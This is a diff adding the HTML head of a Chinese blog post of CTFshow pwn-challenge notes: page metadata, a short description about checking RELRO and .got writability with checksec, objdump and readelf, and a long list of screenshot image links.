@@ -1,0 +1,1304 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fufu.png">
+  <link rel="icon" href="/img/fufu.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Meiyouqian">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="对于pwn入门的一系列题目有了一个明确的做法  对于.got和.got.plt是否可写可以直接参照这个表搜索 然后这个RELRO可以直接checksec出，方便明确了不少，我觉得我之前就是纯瞎做，做到哪算哪 然后再去查地址就行 objdump -h pwn20 或者readelf -S .&#x2F;pwn20 |grep ‘.got’ 都可以很快啊查出这些内容，因此pwn20和pwn21都应该这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFshow-Pwn-9月记录">
+<meta property="og:url" content="https://mei-you-qian.github.io/2025/09/30/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="玫幽倩的小博客">
+<meta property="og:description" content="对于pwn入门的一系列题目有了一个明确的做法  对于.got和.got.plt是否可写可以直接参照这个表搜索 然后这个RELRO可以直接checksec出，方便明确了不少，我觉得我之前就是纯瞎做，做到哪算哪 然后再去查地址就行 objdump -h pwn20 或者readelf -S .&#x2F;pwn20 |grep ‘.got’ 都可以很快啊查出这些内容，因此pwn20和pwn21都应该这">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758501334727-75876008-54c3-40c0-a957-ea2c01fe8caf.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758501547909-1eae7d3e-9796-4327-a679-3f0bac655bd3.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758501604455-d68b7632-5f85-4b11-89d5-d1a05c2fed00.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758501701997-62c68d80-12d6-465a-ab59-0501e7e4e023.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758516477583-7b9dd84a-1c20-43bf-8658-a146bf0eda81.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758516615322-eb9a45f9-8f49-444a-b629-775259a4994a.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758516715923-62263ce5-c4db-4e2f-9a3a-04900a293c85.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758516832480-cb50fe9b-2b55-4d70-a331-161c4060925b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758516909563-3c9d5f9c-c9d7-4251-9fc8-db66653276eb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758516945564-574e3b13-8cca-402e-a3af-dbf3aa7d30e0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758517461339-dac0c217-11f4-45aa-b728-bcdec1384f04.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758517568999-e41003a8-35eb-43b4-8436-daf579ebfcc1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758534767054-48dc2591-94fc-4d71-9373-5902c9cf783f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758534755136-c53d755c-7d43-4792-82aa-4826c25f98c8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758534884888-f4780ad1-f770-4faf-835b-182882cf803c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758534959085-53da2310-a0cf-4242-b438-20db47b81e34.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758535094265-816c4d5c-c9cf-4593-8560-61b052bad63f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758535127129-a106faa1-f8e7-4b5c-b8a9-9be29d99d8b7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758535288064-0efc3cd7-7dd1-4508-9214-67d889c331e7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758535997115-b64ece30-4377-4f6c-b027-71efa109553d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536023758-fcf9a7a2-7b54-4b69-bb73-ac145f53adff.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536055096-f4efba1c-35d5-4ee8-805d-52626b2d2f0d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536042983-83f7314d-c592-4b6b-8297-295326c1396b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536108402-5fc893a2-87ab-4e53-aa6d-133e62871502.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536152729-6cc0f164-4a73-47cf-8531-6ae24a8c4d26.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536526352-c0e7a0ca-c0f8-4c06-a0cb-7f607e53700f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536561599-026baf86-759e-479c-bdd7-e8750117e434.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536517073-3421a121-d315-455b-8383-e649b24a3075.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536944474-9a9f4fbc-b634-4954-9c28-49541b0322fe.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537015098-b203d78f-2d84-4582-ac2a-9cdfc6209c9b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537039436-fe7bdd8b-26e8-4b26-8719-c4e64a8a24e6.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537055750-e86e9b59-caec-4ade-a3fc-7796f8861b9e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537077334-f5b26ccc-a27f-4f89-917c-111259f252fd.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536108402-5fc893a2-87ab-4e53-aa6d-133e62871502.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537134652-e3e06428-bbb5-4802-8f52-6f7f945c9fb1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537151994-cc57d184-023f-43c4-8f3c-8036d396d4ce.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537420755-d8655a55-e9c4-418c-ab42-5ce12f67c423.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537445658-9617810f-fbf8-4614-b3a9-37c887c0df66.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537476648-0b79ae3b-b707-4a3f-9c4d-59be8d275f47.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538244808-50203fb4-273e-4fe6-970c-f244440f157d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538293367-fc7c8225-d6d3-4d1b-a71b-27e875d43b62.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537743431-b02268fb-6457-4759-aa93-b26a43d27faf.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537752134-ad5961e5-2fe6-40d6-bc65-fcbdcb1cdb7d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758537800386-bcb77ab7-5479-4d91-a4a6-3d41c9c13944.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538695198-d83ad32f-5885-4720-861b-10240561c43d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538717725-420b043a-09bb-403c-8558-a6d64cd15de5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538766848-0e5bd927-5be7-435b-8cfc-758817032f7b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536108402-5fc893a2-87ab-4e53-aa6d-133e62871502.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538916680-7c967d98-e6c2-4cdd-a4d0-8abd32cfcf47.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538934911-69409bea-9805-4bb4-a5a8-e64f4de67321.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758538942448-e54fa7d5-52ef-41cd-81ee-ef30d50bbe25.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539109116-3366cda2-0a9a-447e-9bff-39f8833c0c47.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539171560-489fbb22-a642-4641-bbb2-c7cf2c541ac6.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539407586-cf5d277d-10e5-4798-b3fb-f0ab14520588.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539470699-136b235f-fc77-480f-9211-5cb2cdd28578.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539463393-e39d704b-99c0-466a-9750-38d65269506b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539508546-ac6c79f8-257d-44fd-9231-315cad05ffae.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758536108402-5fc893a2-87ab-4e53-aa6d-133e62871502.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540145940-194db70a-072f-4123-9192-b703a9fd1955.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539708147-28249dd9-5c4b-4e33-b001-a98ca66777be.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539713418-d3f182c2-c677-43c8-ac5d-dd236313b873.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539773996-add85bec-851f-41c7-ae5c-84c32eae7d46.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539831849-6860772b-3fa1-4447-be8a-9849c29b64af.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539841400-4385c1d1-aed9-4704-816c-ee8457fcc7d8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758539881868-670c45f5-904c-4b98-bcc4-3fe7e515be14.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540172368-b8102b4e-7f98-4e8c-9f3f-15777673d914.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540206740-a04f9ee3-b13a-44cf-ab07-2de9b33d1ed7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540457937-32e3ead7-96f7-42ae-a3d7-ad2206e1f3bb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540537388-eb5ecc35-a20a-4f70-927b-f5cca21eb118.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540563804-5c57a79a-1552-4aad-becc-62bcc6fb8759.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540547525-e1e55fb4-301d-4188-bce6-709e20a25339.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540903607-6e92fb88-d954-46b6-b3c5-40c6c7a39616.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758540959782-2c5b1467-b33d-4676-96d0-417d564859fb.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541070562-6b18150b-afd6-429f-bad6-f1b253d12258.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541104909-1cdcae19-a1c7-4bc8-b809-6b55cd42b32b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541149953-648de55c-b1c0-4e9e-85c4-427671fa2e7d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541213146-c76af34c-72d7-4f36-8126-eb13a5d65434.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541192702-eb30b2c3-0723-4e0a-ab4b-cfeb4d743050.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541265006-5dd87f49-3e9a-425a-9009-ee3483924095.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541409460-99bbb14f-45e2-41d1-b0e1-ed9212c91752.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541341688-dffb42b7-5f2c-4a1a-a4b6-ec309b8af8df.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541443021-3f487e00-674f-483c-a556-39d1140c7f63.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541471787-2cf735be-4d77-459a-bf6a-f209fa96d67c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541500497-b8199f2d-304f-407a-bcc5-77795c873dd6.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541558008-639cd936-b320-4cab-a3d7-155677c5d184.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541652295-732914ea-b804-424a-b0ab-7b6f7df1f886.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758541642580-12e764b9-4c5a-4305-8393-6c5648a9fa04.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758598155272-3ba73ffd-88f7-4e2a-85db-cf7a9be3542c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758598187765-e000722a-cb1c-4565-87d6-d7ed62844d63.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758598211631-fc2e1caa-59d7-4109-b3d6-0ddf37207d18.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758598240922-9fd65f3c-c6b8-40e9-99ac-803fe6133a6d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758598284740-69705076-1fbc-4356-b88d-e0ee8e2d1201.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624097064-dbc65550-41e4-4805-80f3-9c458bd7c4d1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624108214-fc224821-35b4-4538-b691-3426ab03658b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624121637-f005245d-c2ed-4048-a5a5-720ce7ea1eef.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624209042-cb9e784e-323e-4baf-859b-3a673158d981.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624576018-ef88169a-16e8-42be-98c8-2e1c2b8bdd9c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624632536-8f3bc8e9-1bda-40be-88c4-bff4cc3bf8f1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758624255002-b725789a-997a-4d2b-8f66-542d731ba804.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758625980633-973858a7-d81c-42a7-b7b8-1c473ccf5c5e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758625971205-1bfb7a39-2162-420b-82d6-2039375a37f5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626006953-e2432dc3-d197-4692-abd5-f3e389fb1e78.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626047669-8279af1c-01be-4b90-8f67-b66ca91adb5e.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626103108-43b25a20-e40d-425b-98f1-c49d673b06a8.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626113609-accd7d24-f31d-43a6-b33c-bcdea431c5bf.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626148983-257780bc-62a9-49ea-8d86-b86ae06fd838.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626243880-81c96b0b-8db9-4791-ae80-e6f46ea69fde.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626337839-0d829d34-0fb3-41f4-82ff-ed0a990864a0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626372075-eec30af9-84dd-42b6-8f6f-cb067414031d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626477616-7618224f-057b-46b3-b466-da4691343388.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626775522-47343f70-5d58-4512-af69-81a99b2f7b80.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626975239-fdf4e678-c543-461f-a78d-346f482ffa2d.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626958179-a545b6e5-dd90-40c6-8552-8ff740d91fd1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758626999093-be8f26bd-6e83-4f2b-b90b-3bafdaa2feed.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758700515800-6f54dce4-efa4-4e48-a0b5-db73017d9f37.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758700832983-b3c6c93d-ace3-41eb-9df9-9bf17056d2a5.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758700859241-fbe126d0-5690-4b82-b875-47e4adfa7207.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758705229409-a17559e4-f765-4275-9d8d-c61ba668144b.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758712545545-71df3fef-f73c-4271-ad21-6e5bf2d635e0.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758710585078-e73b2260-79ea-42ea-999b-9c298c38eba4.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758705900085-7fd282be-b960-4bc8-9ccf-4afb1ca7ea93.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758710051614-0f896521-f9d6-46a6-9610-86d3b811cbce.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758712314721-684d4b17-d2fe-4f4c-acb7-b32cc2ffe6e7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758937441167-285dc3ab-50c7-4b0a-b21b-b947bbc5060f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758712723203-8e3dffba-7b9c-4b0d-9125-f619d96c97ac.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758713681045-f382b714-1af7-4dcd-9823-14774ae9c6e3.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758713539578-06df82bb-1bf7-4dce-aa48-dbbd5428c2d9.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758938540924-6fc9e332-0ce2-466c-a2b9-eaa856517b6c.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758937898003-2e7b3f71-f393-4f1c-8fd1-e4f7d3d50c83.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758938459923-4b1c687c-64d3-4c35-a26b-2d951944aeaf.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758939051844-b644d0d2-0639-489e-ba5b-a84ce43eda2f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758939087348-0320b9ea-b676-4e37-a266-cdd82e1122fe.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758939173592-c40a239a-a671-466f-88d6-d4d9624117e7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758942405070-66a1ecbf-3050-4b9e-adf4-5156ebe664f7.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758940990431-c56ae5cf-7bd3-4aa7-8fdc-cb8b60220a72.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758942431493-2152badc-9bb7-40fe-b63a-9747041ebfe3.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758941037089-ca15fc7c-e6f4-4962-8ec3-f4e6bfff7059.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758941068609-a29586ce-48c0-49e4-8c91-51db55a11a59.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758941092615-f5dfdc55-3be4-4d7b-a176-27fa01e0a0e1.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758941172700-9777fdff-7b78-435c-a9a2-50a86616138f.png">
+<meta property="og:image" content="https://mei-you-qian.github.io/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758941528829-c2b4c4fa-2a82-4d1d-9e03-2f743c1f21ee.png">
